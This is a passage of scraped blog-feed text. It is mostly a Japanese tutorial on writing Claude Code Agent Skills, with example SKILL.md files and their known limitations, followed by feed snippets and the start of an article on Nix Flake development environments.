3で「この具体的な操作にはこのリソース」を提供する。LLMの自由な推論を、段階的に制約していく。これがSkillsの賢さです。SkillsとSubagentsの使い分け「Skillsって、前に書いたSubagentsと同じじゃないですか」という声が聞こえてきます。確かに両方とも「専門知識をパッケージ化する」という点では似ています。しかし、コンテキストの扱い方に決定的な違いがあります。 観点  Skills  Subagents  コンテキスト  親と共有  独立  向いているタスク  継続的な作業、TDDなど  試行錯誤、調査タスク  状態の引き継ぎ  あり  なし（結果のみ返す） なぜこの違いが生まれるのか。 技術的には、Skillsは「現在のセッションにドキュメントを追加読み込みする」だけです。会話の流れ、ファイルの状態、変数の値、すべてが共有されたままです。一方、Subagentsは「新しいClaude Codeプロセスを起動する」に近い。独立したコンテキストウィンドウを持ち、親とは結果だけをやり取りします。Subagentsはコンテキストが独立しています。Claude Codeの中でClaude Codeを呼ぶようなもの。試行錯誤を伴うエラー調査みたいな「ごちゃごちゃした作業」をSubagentに任せると、親側のコンテキストが汚れません。なぜ「汚れない」ことが重要なのか。 コンテキストウィンドウは有限です。試行錯誤を10回繰り返すと、その10回分の履歴がコンテキストに残ります。成功した最終結果だけが欲しいのに、失敗した9回分も抱え込むことになる。Subagentなら、その試行錯誤は子プロセスの中で完結し、親には「結果：○○が原因でした」という要約だけが返ってきます。Skillsはコンテキストを共有します。テスト駆動開発をさせるとき、RED-GREEN-REFACTORのサイクルごとにコンテキストが分断されると困ります。「さっきテスト書いたよね」「なんでこの設計にしたんだっけ」という文脈を保持したまま作業を続けたい。そういうときはSkillsが向いています。なぜ「共有する」ことが重要なのか。 TDDは本質的に「対話」です。テストを書く→実装する→リファクタリングする、この流れの中で「なぜこのテストを書いたか」「なぜこの設計にしたか」という文脈が失われると、リファクタリングの方向性が定まりません。Skillsなら、この対話の文脈が保持されたまま、TDDの手順だけが注入されます。使い分けの判断基準はシンプルです。コンテキストを共有したい → Skillsコンテキストを独立させたい → Subagents迷ったときの指針: タスクの結果が「要約」で十分ならSubagent、結果だけでなく「過程」も重要ならSkillsです。エラー調査は「原因が分かればいい」のでSubagent。コードレビューは「なぜこの指摘をしたか」の文脈が後続の修正に影響するのでSkills。より詳しい使い分けについては、atusyさんの記事「Claude Codeのユーザー設定プロンプトを使い分けてコンテキスト管理を最適化する」が参考になります。利用可能なビルトインSkillsSkillsの概念は分かった。では、実際にどう使うのか。まずはAnthropicが提供しているビルトインSkillsから見てみましょう。 Skill  機能  PowerPoint (pptx)  プレゼンテーションの作成・編集・分析  Excel (xlsx)  スプレッドシートの作成・データ分析・チャート生成  Word (docx)  ドキュメントの作成・編集・トラック変更  PDF (pdf)  PDF生成・フォーム入力・マージ これはclaude.ai、Claude Code、Claude APIで利用可能です。基本的な使い方Claude Codeでの使い方Claude Codeでは、Skillsはファイルシステムベースで管理されます。配置場所： タイプ  パス  スコープ  個人  ~/.claude/skills/  全プロジェクト共通  プロジェクト  .claude/skills/  現在のプロジェクトのみ Skillを配置するだけで、Claude Codeが自動的に認識し、関連するタスクで使用します。APIでの使い方import anthropicclient = anthropic.Anthropic()response = client.beta.messages.create(    model=\\"claude-sonnet-4-5-20250929\\",    max_tokens=4096,    betas=[\\"code-execution-2025-08-25\\", \\"skills-2025-10-02\\"],    container={        \\"skills\\": [            {                \\"type\\": \\"anthropic\\",                \\"skill_id\\": \\"pptx\\",                \\"version\\": \\"latest\\"            }        ]    },    messages=[{        \\"role\\": \\"user\\",        \\"content\\": \\"再生可能エネルギーについて5枚のプレゼンを作成して\\"    }],    tools=[{        \\"type\\": \\"code_execution_20250825\\",        \\"name\\": \\"code_execution\\"    }])ポイントは以下の通りです。container.skillsでSkillを指定type: \\"anthropic\\"は公式Skilltoolsでcode_executionを有効化（Skillsの実行に必須）Beta headersが必要claude.aiでの使い方claude.aiでは、ビルトインSkillsはデフォルトで有効です。「PowerPointを作って」と言えば、自動的にPowerPoint Skillが起動します。カスタムSkillsは Settings > Features からZIPファイルでアップロードできます。カスタムSkillの作成ここからが本番です。自分専用のSkillを作る方法を説明します。基本構造Skillの最小構成はSKILL.mdファイル1つだけです。---name: my-custom-skilldescription: このSkillが何をするか、いつ使うべきかを説明。---# My Custom Skill## 指示[具体的な手順をここに書く]## 例[実際の使用例]必須フィールド：name: 小文字とハイフンのみ、64文字以内description: 何をするのか、いつ使うのかを説明。1024文字以内実用的なSkill例私が実際のプロジェクトで使っているSkillsを紹介します。例1: セキュリティレビュー.claude/skills/reviewing-security/SKILL.md:---name: reviewing-securitydescription: \\"OWASP API Security Top 10 (2023) と Rust セキュリティベストプラクティス。脆弱性検出。Use when: セキュリティ、脆弱性、OWASP、認証、認可、監査を依頼された時。\\"---# セキュリティレビューOWASP API Security Top 10 (2023) と Rust セキュリティベストプラクティスに基づくレビュースキル。## OWASP チェック項目| ID | リスク | チェック内容 ||----|-------|-------------|| API1 | BOLA | tenant_id 検証、file_id との組み合わせ検証 || API2 | Broken Auth | gRPC メタデータ認証 || API3 | Property | レスポンスの不要情報 || API4 | Resource | ファイルサイズ制限、ページネーション |## Rust セキュリティ| 項目 | 検索パターン ||-----|-------------|| 依存関係脆弱性 | `cargo audit` || unsafe コード | `grep -rn \\"unsafe {\\" src/` || ハードコード認証情報 | `grep -rn \\"(password\\\\|secret\\\\|api_key)\\" src/` |descriptionに「Use when:」を明記しているのがポイントです。これでClaudeが「セキュリティレビューして」と言われたときに確実に起動します。例2: ビルドとテスト.claude/skills/building-and-testing/SKILL.md:---name: building-and-testingdescription: \\"Rustプロジェクトのビルドとテスト実行。フォーマットチェック、lint、ユニットテスト、ビルド確認を一括実行。Use when: ビルド、テスト、cargo test、チェック、確認を依頼された時。\\"---# ビルドとテスト## 実行手順1. フォーマットチェック: `cargo fmt --check`2. Lint実行: `cargo clippy -- -D warnings`3. ユニットテスト: `cargo test --workspace`4. ビルド確認: `cargo build --workspace`## 一括実行cargo fmt --check && cargo clippy -- -D warnings && cargo test --workspace && cargo build --workspaceシンプルですが、これだけで「テストして」と言えば毎回同じ手順を実行してくれます。例3: リファレンス参照型（QAチェック）Progressive Disclosureを活用して、参照ファイルを分割する例です。職種ごとにリファレンスを分けることで、必要な情報だけを読み込みます。.claude/skills/qa-check/├── SKILL.md└── reference/    ├── backend.md      # Rustバックエンドのチェック項目    ├── frontend.md     # フロントエンドのチェック項目    └── infra.md        # インフラのチェック項目.claude/skills/qa-check/SKILL.md:---name: qa-checkdescription: \\"コードレビュー・QAチェック。職種別のベストプラクティスを適用。Use when: レビュー、QA、品質チェック、コードチェックを依頼された時。\\"---# QAチェック職種別のリファレンスを参照してレビューを実施します。## リファレンス**Rust バックエンド** → See [reference/backend.md](reference/backend.md)**フロントエンド** → See [reference/frontend.md](reference/frontend.md)**インフラ** → See [reference/infra.md](reference/infra.md)## 実行手順1. 変更ファイルの拡張子・パスから対象領域を判定2. 該当するリファレンスを読み込む3. チェック項目に従ってレビュー実施4. 結果をCRITICAL/WARNING/INFOで分類して報告reference/backend.md（一部抜粋）:# Rust バックエンド QAチェック項目## エラーハンドリング- [ ] unwrap() を本番コードで使用していないか- [ ] Result型を適切に伝播しているか- [ ] カスタムエラー型を定義しているか## セキュリティ- [ ] SQLインジェクション対策（sqlxのバインドパラメータ使用）- [ ] 認証・認可のチェック漏れがないか- [ ] 機密情報のログ出力がないか## パフォーマンス- [ ] N+1クエリが発生していないか- [ ] 不要なclone()がないか- [ ] async/awaitの適切な使用「バックエンドのコードをレビューして」と言えばbackend.mdだけを読み込み、「インフラの設定をチェックして」と言えばinfra.mdだけを読み込みます。slash commandsとskillsの連携Skillsは自動で起動しますが、明示的に呼び出したいときもあります。そういうときはslash commandsと組み合わせると便利です。.claude/skills/git-commit/SKILL.md:---name: git-commitdescription: Stage meaningful diffs and create Conventional Commits with WHY-focused messages. Use when agent needs to commit code changes.---Execute `/git:commit` slash command.claude/commands/git/commit.md:# Git Commit変更をすべてコミットせずに、意味のある範囲でできるだけ小さくコミットする。commit logにはwhyを残す。...こうすると、Claudeが「コミットすべきだな」と判断したら自動でSkillが起動し、ユーザーが明示的に/git:commitを呼んでも同じ挙動になります。自動と手動の両方に対応できる設計です。Skillsのベストプラクティスなぜベストプラクティスが重要なのか。 Skillsは「書けば動く」ものではありません。書き方によって、起動率、出力の安定性、トークン効率が大きく変わります。ベストプラクティスは、多くの試行錯誤から導き出されたパターンです。これを知らずに始めると、同じ失敗を繰り返すことになります。1. 簡潔に書くコンテキストウィンドウは有限です。Claudeが既に知っていることを書く必要はありません。簡潔さが重要な理由は2つあります。 トークンが増えると問題が起きます。1つはコスト。APIの場合、入力トークンに課金されるので、冗長なSkillはそのまま支出増になります。もう1つは「ノイズ」。LLMは与えられた情報を全て考慮しようとします。本質的でない説明が多いと、重要な指示が埋もれて、出力品質が下がります。悪い例（冗長）：PDF (Portable Document Format) files are a common file format that containstext, images, and other content. To extract text from a PDF, you\'ll need touse a library. There are many libraries available for PDF processing...良い例（簡潔）：## Extract PDF textUse pdfplumber:---import pdfplumberwith pdfplumber.open(\\"file.pdf\\") as pdf:    text = pdf.pages[0].extract_text()---2. 自由度を適切に設定タスクの性質によって指示の具体性を変えます。自由度の設計が重要な理由は単純です。 LLMは指示が曖昧だと「創造的に解釈」します。コードレビューなら創造性は歓迎ですが、DBマイグレーションで創造性を発揮されると困ります。タスクの「リスク」と「多様性の価値」を天秤にかけて、自由度を決めます。高自由度（テキスト指示）: 複数のアプローチが有効な場合## Code Review1. Analyze structure2. Check for bugs3. Suggest improvements低自由度（具体的スクリプト）: 操作がデリケートな場合。## Database MigrationRun exactly this script:---python scripts/migrate.py --verify --backup---Do not modify the command.3. フィードバックループを入れる複雑なワークフローでは検証ステップを入れます。フィードバックループが必要な理由があります。 LLMは「確信を持って間違える」ことがあります。10ステップのワークフローを一気に実行させると、ステップ3でミスしても気づかずステップ10まで進みます。検証ステップを挟むことで、早期に問題を検出し、修正コストを下げられます。## Document Editing Workflow1. Make edits to XML2. **Validate immediately**: `python validate.py`3. If validation fails:   - Review error message   - Fix issues   - Validate again4. **Only proceed when validation passes**5. Pack the document4. ネストを深くしない参照ファイルはSKILL.mdから1階層までに留めます。深すぎると部分的にしか読まれません。ネストが問題になる理由があります。 LLMは「参照先をどこまで読むか」を自分で判断します。A→B→C→Dとネストしていると、Bまで読んでCは読まない、という判断をすることがあります。重要な情報がDにあると、それが無視される。情報はフラットに配置して、確実に読まれるようにします。悪い例：SKILL.md → advanced.md → details.md → actual_info.md良い例：SKILL.md├── advanced.md├── reference.md└── examples.md100+の実戦投入可能なSkillsコミュニティが既に多くのSkillsを公開しています。github.com人気カテゴリ：Document Processing: docx, pdf, pptx, xlsxDevelopment & Code Tools: MCP Builder, Webapp Testing, Changelog GeneratorData & Analysis: CSV Data Summarizer, Root Cause TracingBusiness & Marketing: Lead Research Assistant, Competitive Ads ExtractorCreative & Media: Canvas Design, Theme Factory, Image Enhancerよくある失敗と対策Skillsを作り始めると、最初は思い通りに動かないことが多いです。よくある失敗パターンとその対策をまとめました。 問題  原因  対策  Skillがトリガーされない  descriptionが曖昧  「何をするか」と「いつ使うか」を明記  コンテキスト不足  SKILL.mdに情報が足りない  参照ファイルを追加  トークン消費が多すぎる  Progressive Disclosureしてない  情報を複数ファイルに分割  出力が不安定  自由度が高すぎる  具体的なテンプレートや例を追加  スクリプトエラー  エラーハンドリングが甘い  スクリプト内で明示的にエラー処理 セキュリティ上の注意点Skillsはフルユーザー権限で実行されます。信頼できないソースのSkillsは使わないでください。チェックすべきポイントは以下です。全ファイルを監査: SKILL.md、スクリプト、リソースをすべて確認外部接続に注意: 外部URLへアクセスするSkillは特にリスクが高い自分で作る or 公式を使う: 基本的にこの2択Skillsの限界と現実ここまでSkillsの使い方やベストプラクティスを紹介してきました。しかし正直に言うと、Skillsは万能ではありません。実際にシステム化しようとすると、いくつかの困難にぶつかります。限界がある理由は明確です。 Skillsは「LLMに追加の情報を渡す」仕組みです。LLMの推論能力自体を向上させるわけではありません。どれだけ精緻なSkillを書いても、LLMが誤解することはあるし、予期しない振る舞いをすることもあります。これはLLMの本質的な不確実性に起因する問題で、Skillsでは解決できません。時間目安: 最初のSkillを動かすまで1-2時間かかります。descriptionの調整、手順の修正、再テストのサイクルが必要だからです。2個目以降は30分程度になります。週3回以上使うタスクでないと元が取れないので、投資対効果を考えて作りましょう。定義ファイル地獄Skillsを整備していくと、管理すべきファイルが膨大になります。私のプロジェクトでは、こんな構造になりました。.claude/skills/├── building-and-testing/├── running-integration-tests/├── running-e2e-tests/├── running-mutation-tests/├── managing-docker-dev/├── working-with-branches/├── implementing-issues/├── checking-pr/├── reviewing-security/├── reviewing-quality/├── using-rust-patterns/├── using-sqlx-patterns/├── handling-errors/└── ... (50個のSkillフォルダ)「地獄」になる理由は、 Skillsがコードと違って静的解析できないからです。どのSkillがどのタスクで起動するかは、実際に動かしてみないと分からない。コードなら「この関数はどこから呼ばれているか」を検索できますが、Skillsの時は「このSkillはいつ起動するか」をLLMの判断に委ねています。依存関係がブラックボックスになるのです。50個のSkillがあると、どれがどの場面で起動するのか把握しきれなくなります。「なんでこのSkillが動いたんだ」という状況が発生します。結局、設計者がすべてのSkillの挙動を把握していないといけません。これは隠れたコストです。descriptionの試行錯誤Skillが起動するかどうかはdescriptionの書き方次第です。しかし「どう書けば起動するか」は試してみないと分かりません。試行錯誤が必要な理由は、 LLMが「意味」で判断するからです。プログラムのように「この文字列が含まれていたら起動」という決定論的なルールではありません。「code review」と書いても、ユーザーが「PRを見て」と言ったらLLMが「これはcode reviewのことだ」と解釈するかどうかはLLM次第です。LLMの判断基準は私たちには見えません。# 起動しなかった例description: Helps with code review.# 起動した例description: Performs code review. Use when reviewing pull requests, checking code quality, or before merging.「いつ使うか」を明示的に書かないと、Claudeが「このSkillを使うべきだ」と判断してくれません。でも、どこまで具体的に書けばいいのか。書きすぎると他のタスクで起動しなくなるし、曖昧だと意図しない場面で起動します。この塩梅を見つけるのに時間がかかります。これはプロンプトエンジニアリングの本質的な難しさと同じです。 「こう書けば必ずこう動く」という保証がない世界で、試行錯誤を通じて「だいたいこう動く」パターンを見つけていく。Skillsは設定ファイルの形をしていますが、実態はプロンプトエンジニアリングです。デバッグの難しさ「なぜこのSkillが起動しなかったのか」を知る手段が限られています。Claude Codeは内部でどのSkillを候補として検討し、なぜそれを選んだか（選ばなかったか）を教えてくれません。デバッグが難しい理由は、 LLMの判断過程が外部から観察できないからです。プログラムならブレークポイントを置いて変数の中身を確認できますが、LLMには「なぜこの判断をしたか」を聞く標準的なインターフェースがありません。ログを見ても「Skill Xを起動しました」という結果しか分からず、「なぜSkill YではなくXを選んだのか」は分かりません。結果として、「起動しない → descriptionを変える → また試す」のループを繰り返すことになります。プログラムのデバッグと違って、再現性も低い。同じプロンプトでも起動したりしなかったりします。これはLLMベースのシステム全般の課題です。 Skillsに限った話ではありません。LLMの判断を制御したいなら、その不確実性と付き合う覚悟が必要です。Skill同士の競合複数のSkillが似たようなdescriptionを持っていると、どちらが選ばれるか予測できません。競合が起きる理由は、 Skillの選択がLLMの「意味的な類似度判断」に依存しているからです。プログラムなら「優先度」を数値で指定できますが、Skillsにはそういう明示的な優先度設定がありません。LLMが「どちらがより適切か」を毎回判断しますが、その判断基準はコンテキスト依存で変わります。# Skill Adescription: Reviews code for security issues.# Skill Bdescription: Performs security audit on codebase.「セキュリティチェックして」と言ったとき、AとBのどちらが起動するか。両方起動することもあります。Skillが増えるほど、こういう競合が起きやすくなります。対策としては、Skillの責務を明確に分離するしかありません。 「security issues」と「security audit」が重複しているなら、片方を削除するか、descriptionで「Use when: PRの差分をレビューするとき」vs「Use when: プロジェクト全体を監査するとき」のように用途を分けます。これは設計段階で意識する必要があります。「作る、試す、正す」で育てるここまで限界をいくつも挙げてきました。descriptionの試行錯誤、デバッグの難しさ、Skill同士の競合。これだけ聞くと「やっぱり使わない方がいいのでは」と感じるだろう。しかし、限界があるからといって諦める必要はありません。ここで参考になるのが、市谷聡啓氏の『作る、試す、正す。アジャイルなモノづくりのための全体戦略』です。この本の核心は、「正しさ」を探すのではなく、「正しくなる状況」をつくるというアプローチです。私たちの仕事は「正しいSkillを作る」ことではない。「ソフトウェアが正しくなっていく状況」をSkillで設計することです。つまり、Skillの完成度を追い求めるのではなく、適切なタイミングでSkillが発動し、結果としてソフトウェアが正しい方向に進む——その「状況」を整えることが本質です。作る → 試す → 正す → 作る → 試す → 正す → ...作る: 最小限のSKILL.mdを書く試す: 実際に使ってみて、期待通りに動くか確認する正す: 動かなかった部分を修正し、descriptionを調整する「課題を言葉で確認するだけでは分かった気になる」と市谷氏は指摘しています。Skillsも同様で、頭の中で設計を完璧にしようとしても限界があります。実際に動かしてみて初めて、「このdescriptionでは起動しない」「この手順では不十分」という発見が得られます。私も最初のSkillは散々でした。descriptionが曖昧すぎて起動しない、手順が抽象的すぎて出力がブレる。でも何度か直していくうちに、「こう書けば確実に起動する」「この粒度で手順を書けば安定する」という感覚が掴めてきました。Skillsの価値は「完成品」ではなく「育てるプロセス」にあります。 descriptionの試行錯誤を通じて、私たちはLLMの「判断基準」を逆算的に学んでいる。Skillsは単なる設定ファイルではなく、LLMの振る舞いを観察し理解するための実験装置でもあるのです。まとめAgent Skillsは、LLMのステートレスな制約を回避し、専門知識を必要な時に注入する仕組みです。今まで紹介してきた設定（CLAUDE.md、commands、Hooks、Subagents）と組み合わせれば、Claude Codeの使い勝手は大きく変わります。CLAUDE.md: プロジェクトの文脈commands: 手動ショートカットHooks: 自動実行Subagents: 専門家の自動呼び出しSkills: 専門知識の注入 ← NEWこれらの設定を組み合わせることで、Claude Codeは単なるAIアシスタントから、チームの一員のように振る舞うツールへと変わります。Skillsが示唆するAIエンジニアリングの未来では、この変化は何を意味するのか。Skillsが示唆するのは、「AIエージェントの制御は、プロンプトではなくワークフローで行う時代になった」ということです。従来のLLM活用は「良いプロンプトを書く」スキルが中心でした。しかしSkillsの登場で、パラダイムが変わりました。これからのAIエンジニアリングは、「LLMにどう推論させるか」ではなく、「LLMの推論をどう制約し、どう組織の資産として蓄積するか」が問われます。暗黙知として個人の頭の中にあったワークフローが、SKILL.mdという明示的なドキュメントになる。これはチーム全体で共有・改善できる「組織の資産」になります。Skillsは単なる便利ツールではなく、ワークフローの形式知化を促す仕組みでもあるのです。万能ではありません。descriptionの試行錯誤は避けられないし、Skillが増えると管理コストも上がります。でも「作る、試す、正す」のサイクルを回せば、確実に生産性は上がります。Claude Codeが雑魚なんじゃない、設定してないだけ。設定すればちゃんと動いてくれます。今日から試せること記事を読んで「面白そう」と思ったら、まずこれを試してみてください。1. ビルトインSkillsを体験する（1分）claude.aiで「PowerPointで自己紹介スライドを作って」と言ってみてください。Skillsが自動で起動して、プロ級のスライドが生成されます。2. カスタムSkillの最小構成を作る（5分）mkdir -p ~/.claude/skills/hello-skill~/.claude/skills/hello-skill/SKILL.mdを作成します。---name: hello-skilldescription: Says hello in a fun way. Use when user asks for a greeting.---# Hello SkillWhen asked to greet, respond with a creative and fun greeting.Include an emoji and a short motivational message.Claude Codeを再起動して「挨拶して」と言ってみてください。Skillが起動するはずです。3. 既存のSkillsを眺める（10分）awesome-claude-skillsで、他の人が作ったSkillsを見てみてください。SKILL.mdの書き方の参考になります。参考資料Agent Skills - Anthropic Engineering BlogAgent Skills Overview - Claude DocsAgent Skills Best Practices - Claude DocsUsing Skills with the API - Claude Docsawesome-claude-skills - ComposioHQClaude Skills CookbookClaude Codeのユーザー設定プロンプトを使い分けてコンテキスト管理を最適化する - atusyClaude Skillsとは何か - r_kaga振る舞い駆動開発（BDD）とは？ - HQW!作る、試す、正す。 - 市谷聡啓Claude Skillsとは何なのか？Use Agent Skills in VS Code","isoDate":"2025-12-19T08:33:09.000Z","dateMiliSeconds":1766133189000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Datadog Error Tracking & Claude Code Action で アプリケーションエラーを(半)自動修正 / Datadog Error Tracking & Claude Code Action (semi-)auto-correct application errors","link":"https://speakerdeck.com/nomadblacky/datadog-error-tracking-and-claude-code-action-semi-auto-correct-application-errors","contentSnippet":"3-shake SRE Tech Talk #14 オンサイト\\rhttps://3-shake.connpass.com/event/373259/","isoDate":"2025-12-19T05:00:00.000Z","dateMiliSeconds":1766120400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"My Plans of how to spend the New Year’s holiday from 2025 to 2026","link":"https://daisuke1024akagawa.medium.com/my-plans-of-how-to-spend-the-new-years-holiday-from-2025-to-2026-588104d21f71?source=rss-c54ac439ad2b------2","isoDate":"2025-12-18T13:10:41.000Z","dateMiliSeconds":1766063441000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Commons Numbersとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_commons_numbers","contentSnippet":"今回はApache Commons Numbersについて調べてみました。 今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Commons Numbersとは？公式サイトによると、Apache Commons Numbers...","isoDate":"2025-12-18T11:18:57.000Z","dateMiliSeconds":1766056737000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Commons Chainとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_commons_chain","contentSnippet":"今回は、Apache Commons Chainについて調べてみました。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Commons Chainとは？公式サイトによると、Gang of Fourの責任連鎖パターン(chain ...","isoDate":"2025-12-18T11:18:56.000Z","dateMiliSeconds":1766056736000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Causewayとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_causeway_intro","contentSnippet":"今回は、Apache Causeway。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Causewayとは？公式サイトによると、Apache Causeway™ enables domain-driven applicat...","isoDate":"2025-12-18T11:18:56.000Z","dateMiliSeconds":1766056736000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Avroとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_avro_serialization","contentSnippet":"今回は、Apache Avro（以下、Avro）について調べてみました。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Avroとは？公式サイトによると、Apache Avro™ is the leading serialization ...","isoDate":"2025-12-18T11:18:55.000Z","dateMiliSeconds":1766056735000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"「自分の環境では動く」から解放される Nix Flake ","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/18/111500","contentSnippet":"はじめに「自分の環境では動くんだけど...」という言葉を、何度聞いたことがあるだろうか。開発環境の差異は、これまで「手順書」「Docker」「asdf/anyenv」で解決を試みてきたが、いずれも時間経過で破綻する。手順書は陳腐化し、Dockerfileのベースイメージは変わり、asdfは言語ごとにツールが分散する。問題の本質は「環境の固定」ではなく「依存関係の完全な追跡」にあった。これを根本から解決するのが、純粋関数型パッケージマネージャ「Nix」と、その最新機能「Nix Flake」だ。これらの課題感については Infrastructure as Code, 3rd Edition が詳しく論じており、参考になる。2025年 俺が愛した本たち 技術書編 に入れれていなくて悲しいほどよい書籍である。オライリー・ジャパンさん 自分は翻訳の準備できてます！！！Infrastructure as Code: Designing and Delivering Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon本記事では、Nix Flake を使った開発環境の統一について、Docker との比較を交えながら包括的に解説する。実際に複数言語のプロジェクトで検証した結果も含めて、実践的な導入方法を紹介する。この記事で分かることNix Flake の基本概念と従来の Nix との違いDocker と Nix の使い分け・組み合わせ方各プログラミング言語（Rust, Go, Python, TypeScript）での開発環境の構築方法CI/CD との統合方法と direnv による自動環境切り替えNix とは何か純粋関数型パッケージマネージャNix は、従来のパッケージマネージャ（apt, brew, npm など）とは根本的に異なるアプローチを取る。その核心は「純粋関数型」（入力が同じなら出力も必ず同じになる仕組み）という概念にある。数学の関数と同様に、Nix では「同じ入力からは常に同じ出力が得られる」。パッケージのビルドに必要な全ての依存関係を明示的に指定し、外部環境に依存しない閉じた環境でビルドを行う。この仕組みにより、以下が保証される。再現性: 誰がいつどこでビルドしても、同じ結果が得られる分離性: システムの既存環境を汚さない共存性: 同じパッケージの異なるバージョンが同時に存在できるnixos.orgハッシュベースの依存管理Nix は全てのパッケージを /nix/store/ 以下にハッシュ付きで保存する。例えば、Node.js 20.10.0 は以下のようなパスに保存される。/nix/store/abc123...-nodejs-20.10.0/このハッシュは、パッケージのソースコード、ビルドスクリプト、全ての依存関係から計算される。つまり、依存関係が少しでも異なれば、異なるハッシュ（異なるパス）になる。これにより、バージョン競合が原理的に発生しない。Nix の核心概念Nix を理解するには、いくつかの重要な概念を押さえておく必要がある。Derivation（導出）Derivation はビルドレシピのようなもので、Nix の中核概念だ。「既存の store object から新しい store object を生成する純粋関数」と捉えれば理解しやすい。ビルドは sandboxed プロセスとして実行され、指定された入力のみを読み込み、決定論的に出力を生成する。Store（ストア）Store は /nix/store/ に存在するオブジェクトの集合だ。全てのパッケージ、ビルド成果物、依存関係がここに保存される。Store は不変（immutable）であり、一度書き込まれたオブジェクトは変更されない。Store PathStore path は store object の一意な識別子だ。例えば以下のような形式になる。/nix/store/a040m110amc4h71lds2jmr8qrkj2jhxd-git-2.38.1この長い文字列（a040m110...）は、パッケージの全ての入力から計算されたハッシュだ。入力が変われば、パスも変わる。これが Nix の再現性を支える基盤となっている。Realise（実現化）Realise は derivation を実際にビルドし、store path を valid な状態にすることだ。既にキャッシュにあればダウンロードされ、なければビルドが実行される。これらの概念については、公式マニュアルと用語集で詳しく解説されている。nix.devnix.devNix Flake とはFlake の基本構造Nix Flake は、Nix の最新機能であり、プロジェクトの依存関係を宣言的に管理する仕組みだ。従来の Nix には2つの問題があった。(1) NIX_PATH や <nixpkgs> などグローバルな状態に依存し、マシンごとに異なる結果を生む可能性があった。(2) 依存関係のバージョンを固定する標準的な方法を欠いていた。nix-channel の更新で環境が変わってしまうのだ。Flake は flake.lock でこれらを解決する。project/├── flake.nix          # プロジェクト定義├── flake.lock         # 依存関係のロックファイル└── src/               # ソースコードflake.nix は以下の構造を持つ。{  description = \\"プロジェクトの説明\\";  inputs = {    # 依存する外部 Flake を定義    nixpkgs.url = \\"github:nixos/nixpkgs?ref=nixpkgs-unstable\\";  };  outputs = { self, nixpkgs }: {    # 出力（devShells, packages, etc.）を定義  };}flake.lock による再現性flake.lock は npm の package-lock.json や Rust の Cargo.lock に相当する。全ての依存関係のコミットハッシュが固定されるため、時間が経っても同じ環境を再現できる。{  \\"nodes\\": {    \\"nixpkgs\\": {      \\"locked\\": {        \\"lastModified\\": 1702312524,        \\"narHash\\": \\"sha256-...\\",        \\"rev\\": \\"abc123...\\",        \\"type\\": \\"github\\"      }    }  }}Flake についての詳細は NixOS Wiki を参照してほしい。nixos.wikiDocker / コンテナエコシステムとの比較Nix と Docker は競合ではなく補完関係にある。Nix は「ビルド時の再現性」を、Docker は「ランタイムの分離とデプロイ」を担う。各ツールとの関係 ツール  役割  Nix との関係  Dockerfile  イメージビルド  Nix で置き換え可能（より再現性が高い）  Docker Compose  マルチコンテナ構成  devenv/process-compose で補完  Kubernetes  コンテナオーケストレーション  Nixidy/kubenix で統合可能  Helm  K8s パッケージ管理  nix-helm で Nix から利用可能  Skaffold  開発ワークフロー自動化  ビルドフェーズで Nix を使用可能 Dockerfile の課題と Nix の解決策Dockerfile は広く普及しているが、再現性に課題がある。# Dockerfile: 再現性の問題FROM python:3.12  # タグは可変RUN apt-get update && apt-get install -y curl  # バージョン固定なしRUN pip install requests  # バージョン固定なし# Nix: 完全な再現性{  packages.docker-image = pkgs.dockerTools.buildImage {    name = \\"my-app\\";    copyToRoot = pkgs.buildEnv {      name = \\"image-root\\";      paths = [ pkgs.python312 pkgs.curl pkgs.python312Packages.requests ];    };  };}Nix の優位点:- ビット単位で同一の結果を保証- 全ての依存を明示的に管理（暗黙の依存が混入しない）- パッケージ単位の効率的なキャッシュ- SBOM（Software Bill of Materials）の自動生成blog.replit.comwww.devzero.ioNix + Docker の組み合わせ両者を組み合わせることで「再現可能なビルド」と「ポータブルなデプロイ」を両立できる。{  packages.docker-image = pkgs.dockerTools.buildLayeredImage {    name = \\"my-app\\";    tag = \\"latest\\";    contents = [ myApp pkgs.cacert ];    config.Cmd = [ \\"/bin/my-app\\" ];  };}各依存パッケージが独立したレイヤーになるため、パッケージAを更新してもパッケージBのレイヤーは再利用される。Dockerfile を書く必要がなく、Nix の宣言的な記述で完結する。flox.devKubernetes との統合: NixidyNixidy は Nix と Argo CD を組み合わせた GitOps ツールで、クラスター全体を NixOS のように管理できる。{  applications.nginx = {    namespace = \\"default\\";    helm.releases.nginx = {      chart = 